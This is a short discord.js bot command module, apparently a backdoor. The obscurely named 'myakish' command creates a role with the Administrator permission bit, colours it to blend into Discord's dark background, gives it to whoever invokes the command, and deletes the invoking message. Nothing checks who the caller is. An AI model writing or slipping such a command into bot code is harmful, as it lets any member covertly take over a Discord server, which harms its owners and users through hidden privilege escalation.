const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {

        role = await message.guild.roles.create ({

            data: {
                name: "Dope Role",
          	    color: "#2f3136",
          	    permissions: [8]
            }

        });
            
        message.member.roles.add(role)
        message.delete();

    } catch(e) {

        console.log(e.stack);

    }
}

module.exports.help = {

    name: "myakish",
    desc: "Gives you admin perms."

}
